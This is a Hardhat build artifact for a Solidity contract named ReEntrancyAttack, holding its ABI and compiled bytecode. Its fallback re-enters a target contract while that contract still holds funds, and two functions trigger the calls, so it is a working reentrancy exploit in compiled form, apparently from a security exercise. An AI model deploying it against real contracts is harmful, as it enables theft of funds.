{
  "_format": "hh-sol-artifact-1",
  "contractName": "ReEntrancyAttack",
  "sourceName": "contracts/ReEntrancyAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "ReentranceAttack1",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "ReentranceAttack2",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526040516103b13803806103b18339818101604052810190610025919061010f565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013c565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100dc826100b1565b9050919050565b6100ec816100d1565b81146100f757600080fd5b50565b600081519050610109816100e3565b92915050565b600060208284031215610125576101246100ac565b5b6000610133848285016100fa565b91505092915050565b6102668061014b6000396000f3fe60806040526004361061002d5760003560e01c80630bddd66d146100f3578063fcd36e9c1461010a5761002e565b5b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156100f15760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312210e8a6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100d857600080fd5b505af11580156100ec573d6000803e3d6000fd5b505050505b005b3480156100ff57600080fd5b50610108610121565b005b34801561011657600080fd5b5061011f6101a6565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631f8cdb046103e86040518263ffffffff1660e01b81526004016000604051808303818588803b15801561018b57600080fd5b505af115801561019f573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631f8cdb0466038d7ea4c680006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561021557600080fd5b505af1158015610229573d6000803e3d6000fd5b505050505056fea2646970667358221220e2ef54b0d638a7f0c22a4bc67dc78975bf33a6528d77d2c03ad0b4310674764964736f6c63430008150033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}